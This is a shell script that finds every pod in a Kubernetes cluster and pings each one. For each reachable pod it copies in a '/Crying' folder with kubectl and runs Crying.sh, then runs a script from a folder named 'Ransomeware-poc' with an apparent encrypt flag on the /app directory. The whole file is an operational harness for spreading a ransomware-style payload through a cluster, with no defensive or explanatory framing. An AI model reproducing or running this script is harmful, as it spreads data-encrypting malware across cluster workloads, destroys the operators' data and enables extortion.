#!/bin/sh

# Define the folder to be copied and the script to execute
FOLDER_TO_PUSH="/Crying"

# Ensure necessary tools are available
echo "Ensuring required tools are available..."
apk update && apk add --no-cache curl bash || {
    echo "Failed to install required tools."
    exit 1
}

# Get the list of pod IPs
POD_IPS=$(kubectl get pods -o wide --no-headers | awk '{print $6}')

# Loop through each IP and check connectivity
for IP in $POD_IPS; do
    echo "Pinging Pod IP: $IP"
    if ping -c 4 $IP > /dev/null; then
        echo "Ping successful: $IP"
        
        # Get the pod name based on the IP
        POD_NAME=$(kubectl get pods -o wide --no-headers | grep "$IP" | awk '{print $1}')
        
        # Push folder to the pod
        echo "Attempting to push folder to pod $POD_NAME..."
        kubectl cp "$FOLDER_TO_PUSH" "$POD_NAME:/app" || {
            echo "Failed to push folder to pod: $POD_NAME"
            continue
        }
        echo "Folder successfully pushed to pod: $POD_NAME"

        # Execute the script inside the pod
        echo "Executing the script inside the pod $POD_NAME..."
        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/Crying.sh && /app/Crying/Crying.sh" || {
            echo "Failed to execute Crying.sh in pod: $POD_NAME"
            continue
        }
        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Ransomeware-poc/main.py && python3 /app/Ransomeware-poc/main.py -p /app -e" || {
            echo "Failed to execute main.py in pod: $POD_NAME"
        }
        echo "Scripts executed successfully in pod: $POD_NAME"
    else
        echo "Failed to reach IP: $IP"
    fi
    echo "-----------------------------------"
done
